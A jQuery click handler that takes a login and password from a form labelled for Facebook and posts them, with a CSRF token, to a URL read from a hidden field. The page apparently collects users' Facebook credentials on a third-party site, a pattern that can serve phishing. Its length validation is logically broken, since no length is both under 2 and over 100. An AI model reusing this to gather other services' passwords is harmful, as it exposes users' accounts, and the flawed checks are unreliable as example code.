$('.facebook').on('click', function(){
    $('#progress').show();
    $('#progress').attr("class", "spinner-border spinner-border-sm")
    var formData = new FormData();
    login = $('#login').val();
    if(login =='' || login.length < 2 && login.length > 100){
        alert("Error! Please, check your login");
        $('#progress').attr("class", "fi fi-check")
        return false;
    }
    formData.append('login', login);
    password = $('#password').val();
    if(password =='' || password.length < 2 && password.length > 100){
        alert("Error! Please, check your password");
        $('#progress').attr("class", "fi fi-check")
        return false;
    }
    formData.append('password', password);
    csrf_token =  $('input[name="csrf_token"]').attr('value');
    formData.append('csrfmiddlewaretoken', csrf_token);
    console.log(formData);
    postUrl = $('#url_facebook').val();
    console.log(postUrl);
    $.post({url: postUrl,
            dataType: "json",
            data:formData,
            processData:false,
            contentType: false,
        }).done(function(result) {
                if (result._code == 0 ){
                    $('#progress').attr("class", "fi fi-check")
                    location.reload();
                    }
                else{
                    $('#progress').attr("class", "fi fi-check")
                    $('.telegram').text("Error! Click again")
                    }
        });
});
